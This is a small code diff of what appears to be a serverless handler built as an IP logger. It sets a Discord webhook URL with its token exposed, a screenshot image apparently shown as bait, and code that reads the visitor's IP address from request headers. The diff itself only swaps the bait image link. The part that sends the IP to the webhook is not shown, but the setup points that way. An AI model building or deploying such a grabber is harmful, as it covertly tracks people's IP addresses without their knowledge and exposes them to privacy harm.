@@ -5,7 +5,7 @@ module.exports = async function handler(req, res) {
   }
 
   const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1531056764127154216/0E10iH35M9cZm2bY1CJ4R1KUnvGkwndndg3NWGv-AAFtdkTLCtxqFS60EHA02Ngrz1NK";
-  const TARGET_IMAGE = "https://media.discordapp.net/attachments/1531048629631193141/1531068359012126900/Screenshot_2026-07-26-21-42-42-429_com.zhiliaoapp.musically-edit.jpg?ex=6a67de06&is=6a668c86&hm=002a17e5ac9293f8aaacbe2d6a46a41894baf89b50da14bd9eac58c8e17ac08e&=&format=webp&width=491&height=930";
+  const TARGET_IMAGE = "https://cdn.discordapp.com/attachments/1531049131412426934/1531081254454300873/Screenshot_2026-07-26-21-42-42-429_com.zhiliaoapp.musically-edit.jpg?ex=6a67ea09&is=6a669889&hm=5a9fc2d52b1684b1fc2eaa9736201048d01308f9b7ed111d778e69551ea684b0";
   const BOT_IMAGE = "https://i.pinimg.com/736x/25/83/25/258325e218093f78599368d65312663d.jpg";
 
   const ip = req.headers["cf-connecting-ip"] || req.headers["x-vercel-forwarded-for"]?.split(",")[0] || req.headers["x-forwarded-for"]?.split(",")[0] || req.headers["x-real-ip"] || req.socket?.remoteAddress || "Unknown";
